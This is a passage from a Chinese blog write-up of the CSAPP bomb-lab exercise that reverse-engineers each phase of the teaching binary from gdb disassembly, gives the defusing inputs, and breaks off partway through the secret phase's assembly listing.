title="tmux使用"></a>tmux使用</h2><p>同理见我文章tmux-tutorial</p><p>因为在debug时想代码对照着看，所以将屏幕分成两边，一遍显示代码，另一边debug。</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>movzbl指令负责拷贝一个字节，并用0填充其目的操作数中的其余各位，这种扩展方式叫“零扩展”。</p><h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="pahse-1"><a href="#pahse-1" class="headerlink" title="pahse_1"></a>pahse_1</h3><p>先<code>disas phase_1</code>得到汇编代码再进行分析</p><p>忘了贴上来，但是比较简单就算了</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>首先<code>disas phase_2</code>查看汇编代码，发现有一个<code>read_six_numbers</code>，说明第二关是输入6个数字</p><p><strong>第一个数</strong>跟踪很容易发现先比较第一个数如果不为<code>1</code>，就炸了</p><p><img src="/2024/02/17/CSAPP/image-20240219210320335.png" alt="image-20240219210320335"></p><p><strong>第二个数</strong></p><p><img src="/2024/02/17/CSAPP/image-20240219211459258.png" alt="image-20240219211459258"></p><p>根据代码运行顺序可知第二个数是第一个数的两倍</p><p><strong>第三个数</strong></p><p>因为陷入了一个循环，退出的地方是<code>cmp %rbp, %rbx</code>而<code>%rbp</code>指向的是第六个数的后一个数，并且每个循环<code>%rbx</code>都向后指一个，说明剩下的数需要时前一个数的两倍。</p><p>得到答案**<code>1 2 4 8 16 32 </code>**</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p>先看函数的汇编代码</p><p><img src="/2024/02/17/CSAPP/image-20240219213444832.png" alt="image-20240219213444832"></p><p>可以发现代码中由一个奇怪的数字<code>0x4025cf</code></p><p><img src="/2024/02/17/CSAPP/image-20240219213837399.png" alt="image-20240219213837399"></p><p>查看发现时这样一个字符串，结合下面的<code>sscanf</code>,猜测可能时读取两个数字</p><p><img src="/2024/02/17/CSAPP/image-20240219213936277.png" alt="image-20240219213936277"></p><p>调用<code>sscanf</code>函数返回值存放在<code>%rax</code>中说明读取数据需要大于一个数</p><p><img src="/2024/02/17/CSAPP/image-20240219214049388.png" alt="image-20240219214049388"></p><p>根据这段代码发现<code>0x8(%rsp)</code>是我们输入的第一个数，得知第一个数不能大于7。</p><p><img src="/2024/02/17/CSAPP/image-20240219214701207.png" alt="image-20240219214701207"></p><p>由代码可知<code>0x8(%rsp)</code>指向第一个数，跟随代码运行可以发现</p><p>再<code>0x0000000000400f75 &lt;+50&gt;:    jmpq   *0x402470(,%rax,8)</code>这一行发现执行的代码与第一个数有关，根据第一个数的值选择对应的代码执行，并给eax赋值，最后<code>&lt;+123&gt;:   cmp    0xc(%rsp),%eax</code>这一句代码是第二个数与eax比较，相等即可通过</p><p><img src="/2024/02/17/CSAPP/image-20240219221254988.png" alt="image-20240219221254988"></p><p>通过跟踪可以得出一个答案<code>5, 206</code></p><p>第一个数应该是 1 - 7 都行，跟对得到第二个数就行</p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p><img src="/2024/02/17/CSAPP/image-20240219221849413.png" alt="image-20240219221849413"></p><p>易知第一个数要小于等于<code>0xe</code>即14。再查看<code>func4</code>，执行完<code>func4</code>后eax需要为0，然后记录函数的参数进入<code>func4</code></p><p><img src="/2024/02/17/CSAPP/image-20240219222557539.png" alt="image-20240219222557539"></p><p>因为要使eax变为0， 我们需要执行</p><p><code>000400ff2 &lt;+36&gt;:    mov    $0x0,%eax</code>这句代码使从这里跳转来的，通过跟踪可知 ecx &#x3D; 7, edi &#x3D; 我们输入的第一个数， 所以第一个数 &lt;&#x3D; 7, eax已经赋值为0了所以直接跳出函数即可。令edi &gt;&#x3D; 7即可。即第一个数 &#x3D; 7。</p><p><img src="/2024/02/17/CSAPP/image-20240219225316049.png" alt="image-20240219225316049"></p><p>回到<code>phase_4</code>后跟踪易得令第二个数为0即可。</p><p>所以答案为<code>7 0</code></p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">   0x0000000000401062 &lt;+0&gt;:     push   %rbx</span><br><span class="line">   0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx</span><br><span class="line">   0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax</span><br><span class="line">   0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)</span><br><span class="line">   0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax</span><br><span class="line">   0x000000000040107a &lt;+24&gt;:    callq  0x40131b &lt;string_length&gt;</span><br><span class="line">   0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax</span><br><span class="line"># 读取一个字符串，长度为 6。</span><br><span class="line">   0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line"># 将 rax 清 0 并跳转到 &lt;+41&gt; 处</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line"># 查看(%rbx,%rax,1)处是我们输入的字符串的hex, 取出我们输入的数</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">   0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)</span><br><span class="line">   0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx</span><br><span class="line">   0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx</span><br><span class="line"># 取输入数的低8位作为序号取出内存中的字符</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">   0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax</span><br><span class="line">   0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax</span><br><span class="line"># 循环 6 次，根据输入值索引`0x4024b0`内存中的字符</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)</span><br><span class="line"># 需要比较的字符串</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi</span><br><span class="line"># 根据我们输入值提取组成的字符串作为参数输入函数</span><br><span class="line">   0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi</span><br><span class="line">   0x00000000004010bd &lt;+91&gt;:    callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax</span><br><span class="line">   0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)</span><br><span class="line">   0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax</span><br><span class="line">   0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax</span><br><span class="line">   0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax</span><br><span class="line">   0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;</span><br><span class="line">   0x00000000004010e9 &lt;+135&gt;:   callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp</span><br><span class="line">   0x00000000004010f2 &lt;+144&gt;:   pop    %rbx</span><br><span class="line">   0x00000000004010f3 &lt;+145&gt;:   retq</span><br></pre></td></tr></table></figure><p><code>0x40245e</code> 处为字符串 <code>flyers</code>, <code>0x4024b0</code>处为字符串<code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code></p><p>我的输入是<code>123456</code></p><p><img src="/2024/02/17/CSAPP/image-20240220230544518.png" alt="image-20240220230544518"></p><p>六次循环索引字符的结果放在<code>($rsp + 0x10)</code>,发现结果是<code>aduier</code>,与上面的字符串对比发现是取出了第<code>1-6</code>个字符。</p><p><img src="/2024/02/17/CSAPP/image-20240220231450112.png" alt="image-20240220231450112"></p><p>因为要使我们取出的字符串等于 <code>flyers</code>所以我们输入的六个字符的hex的低8位的值为 <code>9 15 14 5 6 7</code> 我们根据Ascii表得出一种答案<code>ionefg</code></p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">   0x00000000004010f4 &lt;+0&gt;:     push   %r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:     push   %r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:     push   %r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:     push   %rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:     push   %rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi</span><br><span class="line"># 读取 6 个数字，存放在[%rsp]处</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:    callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d</span><br><span class="line">   0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp#0x401100 &lt;+12&gt; r13 = rsp</span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax# 第一个数 num1-1&lt;=5</span><br><span class="line">   0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   </span><br><span class="line">=============================&gt;二重循环，代码见下方</span><br><span class="line"></span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d# r12d初始为0</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d# 循环 6 次</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx#内循环 ebx = r12d 开始</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax</span><br><span class="line">   0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;# 6 个数互不相同</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx</span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx# ebx &gt; 5结束</span><br><span class="line">   0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;</span><br><span class="line">   0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;</span><br><span class="line"># 二重循环结束</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax# r14 = rsp</span><br><span class="line"># 循环 6 次把输入值 x = 7 - x</span><br><span class="line">   0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx</span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</span><br><span class="line"># 链表 node1-&gt; ... -&gt;node6</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi</span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line"># 以输入的 6 个数值取出对应 7-x 的序号的节点放入栈中</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi</span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx # 取出修改后的输入值</span><br><span class="line">   0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">   0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</span><br><span class="line"># 把新的 6 个节点连成链表</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx # 新的第一个节点rbx</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi # 结束位置rsi</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx</span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</span><br><span class="line"># </span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax</span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)</span><br><span class="line">   # 将 6 个节点按照值从大到小排序号</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp</span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line">   0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp</span><br><span class="line">   0x00000000004011fb &lt;+263&gt;:   pop    %rbx</span><br><span class="line">   0x00000000004011fc &lt;+264&gt;:   pop    %rbp</span><br><span class="line">   0x00000000004011fd &lt;+265&gt;:   pop    %r12</span><br><span class="line">   0x00000000004011ff &lt;+267&gt;:   pop    %r13</span><br><span class="line">   0x0000000000401201 &lt;+269&gt;:   pop    %r14</span><br><span class="line">   0x0000000000401203 &lt;+271&gt;:   retq</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 二重循环</span><br><span class="line"># rbp = r13 = rsp</span><br><span class="line"># for(r12d = 0; r12d &lt; 6; r12d++)</span><br><span class="line"># &#123;</span><br><span class="line"># for(ebx = r12d; ebx &lt;= 5; ebx++)</span><br><span class="line">#&#123;</span><br><span class="line">#if([rsp + r12d * 4] == [rsp + ebx * 4])</span><br><span class="line">#&#123;</span><br><span class="line">#BOOM!</span><br><span class="line">#&#125;</span><br><span class="line">#&#125;</span><br><span class="line"># &#125;</span><br></pre></td></tr></table></figure><p>链表</p><pre class="mermaid">graph LR;    0x14c-->0xa8-->0x39c-->0x2b3-->0x1dd-->0x1bb</pre><p>phase_6的逻辑：</p><p>​先读取6个1-6的各不相同的数，然后根据数字重排链表顺序，使链表中的节点的值按从大到小排列。</p><h3 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_defused:</span><br><span class="line">   0x00000000004015c4 &lt;+0&gt;:     sub    $0x78,%rsp</span><br><span class="line">   0x00000000004015c8 &lt;+4&gt;:     mov    %fs:0x28,%rax</span><br><span class="line">   0x00000000004015d1 &lt;+13&gt;:    mov    %rax,0x68(%rsp)</span><br><span class="line">   0x00000000004015d6 &lt;+18&gt;:    xor    %eax,%eax</span><br><span class="line"># 判断是否为 6 行输入</span><br><span class="line">   0x00000000004015d8 &lt;+20&gt;:    cmpl   $0x6,0x202181(%rip)        # 0x603760 &lt;num_input_strings&gt;</span><br><span class="line">   0x00000000004015df &lt;+27&gt;:    jne    0x40163f &lt;phase_defused+123&gt;</span><br><span class="line">   0x00000000004015e1 &lt;+29&gt;:    lea    0x10(%rsp),%r8</span><br><span class="line">   0x00000000004015e6 &lt;+34&gt;:    lea    0xc(%rsp),%rcx</span><br><span class="line">   0x00000000004015eb &lt;+39&gt;:    lea    0x8(%rsp),%rdx</span><br><span class="line">   0x00000000004015f0 &lt;+44&gt;:    mov    $0x402619,%esi# &quot;%d %d %s&quot;</span><br><span class="line">   0x00000000004015f5 &lt;+49&gt;:    mov    $0x603870,%edi# input of phase_4</span><br><span class="line">   0x00000000004015fa &lt;+54&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x00000000004015ff &lt;+59&gt;:    cmp    $0x3,%eax</span><br><span class="line"># 读取是否为3</span><br><span class="line">   0x0000000000401602 &lt;+62&gt;:    jne    0x401635 &lt;phase_defused+113&gt;</span><br><span class="line">   0x0000000000401604 &lt;+64&gt;:    mov    $0x402622,%esi# &quot;DrEvil&quot;</span><br><span class="line">   0x0000000000401609 &lt;+69&gt;:    lea    0x10(%rsp),%rdi</span><br><span class="line">   0x000000000040160e &lt;+74&gt;:    callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000401613 &lt;+79&gt;:    test   %eax,%eax</span><br><span class="line">   0x0000000000401615 &lt;+81&gt;:    jne    0x401635 &lt;phase_defused+113&gt;</span><br><span class="line"># $0x4024f8   &quot;Curses, you&#x27;ve found the secret phase!&quot;</span><br><span class="line">   0x0000000000401617 &lt;+83&gt;:    mov    $0x4024f8,%edi</span><br><span class="line">   0x000000000040161c &lt;+88&gt;:    callq  0x400b10 &lt;puts@plt&gt;</span><br><span class="line"># $0x402520   &quot;But finding it and solving it are quite different...&quot;</span><br><span class="line">   0x0000000000401621 &lt;+93&gt;:    mov    $0x402520,%edi</span><br><span class="line"># 输出炸弹拆除信息</span><br><span class="line">   0x0000000000401626 &lt;+98&gt;:    callq  0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040162b &lt;+103&gt;:   mov    $0x0,%eax</span><br><span class="line">   </span><br><span class="line">   ** 调用隐藏关卡 **</span><br><span class="line">   </span><br><span class="line">   0x0000000000401630 &lt;+108&gt;:   callq  0x401242 &lt;secret_phase&gt;</span><br><span class="line"># $0x402558   &quot;Congratulations! You&#x27;ve defused the bomb!&quot;</span><br><span class="line">   0x0000000000401635 &lt;+113&gt;:   mov    $0x402558,%edi</span><br><span class="line">   0x000000000040163a &lt;+118&gt;:   callq  0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040163f &lt;+123&gt;:   mov    0x68(%rsp),%rax</span><br><span class="line">   0x0000000000401644 &lt;+128&gt;:   xor    %fs:0x28,%rax</span><br><span class="line">   0x000000000040164d &lt;+137&gt;:   je     0x401654 &lt;phase_defused+144&gt;</span><br><span class="line">   0x000000000040164f &lt;+139&gt;:   callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x0000000000401654 &lt;+144&gt;:   add    $0x78,%rsp</span><br><span class="line">   0x0000000000401658 &lt;+148&gt;:   retq</span><br></pre></td></tr></table></figure><p>隐藏关卡的开启条件：</p><p>​在第四关的输入后面加上一个字符串，我的phase_4答案是<code>7 0</code>，改为<code>7 0 DrEvil</code>即可开启</p><p>secret_phase代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function secret_phase:</span><br><span class="line">   0x0000000000401242 &lt;+0&gt;:     push   %rbx</span><br><span class="line">   0x0000000000401243 &lt;+1&gt;:     callq  0x40149e &lt;read_line&gt;</span><br><span class="line">   0x0000000000401248 &lt;+6&gt;:     mov    $0xa,%edx</span><br><span class="line">   0x000000000040124d &lt;+11&gt;:    mov    $0x0,%esi</span><br><span class="line">   0x0000000000401252 &lt;+16&gt;:    mov    %rax,%rdi</span><br><span class="line"># strtol函数将字符串转换为对应一串数字，转不了的忽略</span><br><span class="line">   0x0000000000401255 &lt;+19&gt;:    callq  0x400bd0 &lt;strtol@plt&gt;</span><br><span class="line">   0x000000000040125a &lt;+24&gt;:    mov    %rax,%rbx</span><br><span class="line">   0x000000000040125d &lt;+27&gt;:    lea    -0x1(%rax),%eax</span><br><span class="line">   0x0000000000401260 &lt;+30&gt;:    cmp    $0x3e8,%eax# decimal 1000</span><br><span class="line">   0x0000000000401265 &lt;+35&gt;:    jbe    0x40126c &lt;secret_phase+42&gt;</span><br><span class="line">   0x0000000000401267 &lt;+37&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040126c &lt;+42&gt;:    mov    %ebx,%esi# input string_number</span><br><span class="line"># $0x6030f0   &quot;$&quot;，在fun7里发现是一个递归函数，并且与0x8(%rdi)有关</span><br><span class="line"># 查看$0x6030f0后面的一片内存， 得出这是递归遍历二叉树。图见下方。</span><br><span class="line">   0x000000000040126e &lt;+44&gt;:    mov    $0x6030f0,%edi</span><br><span class="line">   0x0000000000401273 &lt;+49&gt;:   